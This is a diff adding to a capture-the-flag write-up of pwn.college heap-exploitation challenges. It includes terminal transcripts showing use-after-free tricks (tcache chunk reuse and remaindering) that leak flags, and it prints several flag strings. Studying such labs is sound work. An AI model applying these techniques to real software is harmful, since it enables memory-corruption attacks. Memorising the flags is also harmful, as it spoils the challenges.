@@ -316,7 +316,7 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-The second `maalloc`, at `main+604` is what is called when we use the `read_flag` command. We can tell that it is the second one and not the first call to `malloc` at `main+386`, because the first one takes another input, which is the size of memory to be allocated. So the first call to `malloc` happens when we use the `malloc` command.
+The second `malloc`, at `main+604` is what is called when we use the `read_flag` command. We can tell that it is the second one and not the first call to `malloc` at `main+386`, because the first one takes another input, which is the size of memory to be allocated. So the first call to `malloc` happens when we use the `malloc` command.
 
 Let's put a breakpoint and run.
 
@@ -417,3 +417,149 @@ Data: pwn.college{I2KyXNxk50mkShkCYeSWWeQnub9.0lM3MDL4ITM0EzW}
 
 ### Goodbye!
 ```
+
+&nbsp;
+
+## Freebin Feint (Easy)
+
+```
+hacker@dynamic-allocator-misuse~freebin-feint-easy:~$ /challenge/freebin-feint-easy 
+###
+### Welcome to /challenge/freebin-feint-easy!
+###
+
+This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
+challenges, you will become familiar with the concept of heap exploitation.
+
+This challenge can manage up to 1 unique allocations.
+
+
+[*] Function (malloc/free/puts/read_flag/quit): read_flag
+
+[*] flag_buffer = malloc(991)
+[*] flag_buffer = 0x582868eee2c0
+[*] read the flag!
+```
+
+This challenge is very similar to the previous one, only difference being that the size of the `flag_buffer` is pretty arbitrary this time. So we have to allocate the same size when we use `malloc`.
+
+### Exploit
+
+```
+hacker@dynamic-allocator-misuse~freebin-feint-easy:~$ /challenge/freebin-feint-easy 
+###
+### Welcome to /challenge/freebin-feint-easy!
+###
+
+This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
+challenges, you will become familiar with the concept of heap exploitation.
+
+This challenge can manage up to 1 unique allocations.
+
+
+[*] Function (malloc/free/puts/read_flag/quit): read_flag
+
+[*] flag_buffer = malloc(991)
+[*] flag_buffer = 0x582868eee2c0
+[*] read the flag!
+
+[*] Function (malloc/free/puts/read_flag/quit): malloc
+
+Size: 991
+
+[*] allocations[0] = malloc(991)
+[*] allocations[0] = 0x582868eee6b0
+
+[*] Function (malloc/free/puts/read_flag/quit): free
+
+[*] free(allocations[0])
++====================+========================+==============+============================+============================+
+| TCACHE BIN #61     | SIZE: 985 - 1000       | COUNT: 1     | HEAD: 0x582868eee6b0       | KEY: 0x582868eee010        |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x582868eee6b0      | 0                   | 0x3f1 (P)                    | (nil)               | 0x582868eee010      |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/read_flag/quit): read_flag
+
+[*] flag_buffer = malloc(991)
+[*] flag_buffer = 0x582868eee6b0
+[*] read the flag!
+
+[*] Function (malloc/free/puts/read_flag/quit): puts
+
+[*] puts(allocations[0])
+Data: pwn.college{YmZfwVA6aurOwPF9E1iE4IdM40I.01M3MDL4ITM0EzW}
+
+
+[*] Function (malloc/free/puts/read_flag/quit): quit
+
+### Goodbye!
+```
+
+&nbsp;
+
+## Freebin Feint (Hard)
+
+```
+hacker@dynamic-allocator-misuse~freebin-feint-hard:~$ /challenge/freebin-feint-hard 
+###
+### Welcome to /challenge/freebin-feint-hard!
+###
+
+
+[*] Function (malloc/free/puts/read_flag/quit): read_flag
+
+[*] flag_buffer = 0x6241860a12a0
+
+[*] Function (malloc/free/puts/read_flag/quit): quit
+
+### Goodbye!
+```
+
+Again, the `flag_buffer` is some arbitrary size.
+In order to solve this challenge, we have to leverage Remaindering.
+
+### Remaindering
+
+Memory managers handle splitting large memory blocks from the "top chunk" (the largest free block) to satisfy smaller allocation requests, creating a smaller "remainder" block that stays available in the heap.
+
+So, if we allocate a large enough space, then free it, and then call the `read_flag` command, we would not have to worry about the size of `flag_buffer` because it will be split and used from our large buffer allocation.
+
+### Exploit
+
+```
+hacker@dynamic-allocator-misuse~freebin-feint-hard:~$ /challenge/freebin-feint-hard 
+###
+### Welcome to /challenge/freebin-feint-hard!
+###
+
+
+[*] Function (malloc/free/puts/read_flag/quit): malloc
+
+Size: 5000
+
+[*] allocations[0] = 0x5618c504f2a0
+
+[*] Function (malloc/free/puts/read_flag/quit): free
+
+
+[*] Function (malloc/free/puts/read_flag/quit): read_flag
+
+[*] flag_buffer = 0x5618c504f2a0
+
+[*] Function (malloc/free/puts/read_flag/quit): puts
+
+Data: pwn.college{su9bnqD-UlklEnJ8xjHEtaBKtSJ.0FN3MDL4ITM0EzW}
+
+
+[*] Function (malloc/free/puts/read_flag/quit): quit
+
+### Goodbye!
+```
+
+&nbsp;
+
+## Free Flag Fumble (Easy)
